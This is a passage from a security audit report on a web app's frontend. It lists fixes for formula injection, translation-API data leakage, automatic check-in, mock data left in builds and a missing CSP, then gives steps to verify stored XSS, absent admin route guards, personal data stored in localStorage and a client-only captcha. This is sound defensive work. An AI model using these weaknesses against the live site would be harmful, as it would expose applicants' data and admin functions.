  [t('apply.organization')]: sanitizeFormula(app.organization),
  [t('apply.position')]: sanitizeFormula(app.position),
  [t('apply.email')]: sanitizeFormula(app.email),
  [t('apply.phone')]: sanitizeFormula(app.phone),
  [t('apply.country') || 'Mamlakat']: sanitizeFormula(app.country),
  [t('apply.region')]: sanitizeFormula(app.regionName),
  [t('apply.district')]: sanitizeFormula(app.districtName),
  [t('apply.event')]: sanitizeFormula(app.eventTitle),
  [t('apply.presentationTitle')]: sanitizeFormula(app.presentationTitle || "Yo'q"),
  [t('appsAdmin.colStatus')]: getApplicationStatusLabel(app.status, language),
  [t('track.submittedDate')]: formatDate(app.submittedAt, language),
}));
```

#### Fix for VULN-FE-08: Protect Admin Comments from External Translation Leakage
**File**: `src/lib/translationService.ts`
```ts
// Only translate public static marketing strings or configure enterprise backend translation proxy.
// Avoid sending private administrator review notes to public Google endpoints:
export async function translateText(text: string, targetLanguage: Language, sourceLanguage: Language = 'uz'): Promise<string> {
  // If dictionary has it, return:
  const trimmed = text.trim();
  if (DICTIONARY[trimmed]?.[targetLanguage]) {
    return DICTIONARY[trimmed][targetLanguage];
  }
  // If text contains sensitive data or exceeds dictionary, return original text rather than querying public API:
  return text;
}
```

#### Fix for VULN-FE-10: Require User Action for Check-In
**File**: `src/pages/admin/CheckInPage.tsx`
```tsx
// BEFORE (Lines 13-24)
useEffect(() => {
  if (!id) return;
  apiClient.post(`/applications/admin/${id}/check-in/`)...
}, [id]);

// AFTER
// Do not check-in automatically on mount; require explicit button click:
const [confirmed, setConfirmed] = useState(false);

const handleCheckIn = () => {
  setStatus('loading');
  apiClient.post(`/applications/admin/${id}/check-in/`)
    .then(() => setStatus('success'))
    .catch((err) => {
      setStatus('error');
      setMessage(err.response?.data?.message || 'Check-in failed');
    });
};

// Render confirmation prompt:
if (!confirmed && status === 'idle') {
  return (
    <Button onClick={() => { setConfirmed(true); handleCheckIn(); }}>
      Ishtirokchi kelganini tasdiqlash
    </Button>
  );
}
```

#### Fix for VULN-FE-11: Exclude Mock Data from Production Bundles
**File**: `src/lib/mockData.ts` & `src/store/dataStore.tsx`
```ts
// Ensure MOCK_APPLICATIONS and MOCK_ADMIN_USERS are tree-shaken or stripped when import.meta.env.PROD is true:
export const MOCK_APPLICATIONS: Application[] = import.meta.env.DEV ? [ /* mock data */ ] : [];
export const MOCK_ADMIN_USERS: AdminUser[] = import.meta.env.DEV ? [ /* mock data */ ] : [];
```

#### Fix for VULN-FE-13: Add Content Security Policy Meta Tag
**File**: `index.html`
```html
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https:; connect-src 'self' http://localhost:8000 https://form.uzbamalaka.uz; frame-src 'self' https://www.google.com; frame-ancestors 'none';" />
  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
  <meta name="referrer" content="strict-origin-when-cross-origin" />
...
```

---

## 5. Verification Method

To verify these findings independently:

1. **Verify Stored XSS in Link Rendering**:
   - Inspect `src/pages/admin/ApplicationsPage.tsx:401`. Note the direct binding `<a href={selected.documentUrl}`.
   - Run:
     ```powershell
     Select-String -Path "src\pages\admin\ApplicationsPage.tsx" -Pattern "href=\{selected\."
     ```

2. **Verify Route Guard Omission**:
   - Inspect `src/router/index.tsx:35-49` and `src/components/layout/AdminLayout.tsx:6-10`.
   - Confirm that routes `/admin/administrators` and `/admin/settings` are not wrapped in any role-checking component.
   - Inspect `src/components/layout/AdminSidebar.tsx:47-50` to confirm that hiding is purely visual.

3. **Verify LocalStorage PII Dump**:
   - Inspect `src/store/dataStore.tsx:212-218`.
   - Run:
     ```powershell
     Select-String -Path "src\store\dataStore.tsx" -Pattern "STORAGE_KEYS.APPLICATIONS"
     ```
   - Confirm that `localStorage.setItem(STORAGE_KEYS.APPLICATIONS, JSON.stringify(applications))` executes on every `applications` state change.

4. **Verify Client-Side Math Captcha**:
   - Inspect `src/pages/public/ApplicationFormPage.tsx:128-132`.
   - Confirm that `captchaInput` is only checked against `captchaNum1 + captchaNum2` in memory and is never appended to `formData` or verified by the backend.

5. **Build Verification**:
   - Run `npm run build` from the workspace root:
     ```powershell
     npm run build
     ```
   - Confirm the build compiles and observe chunk output.
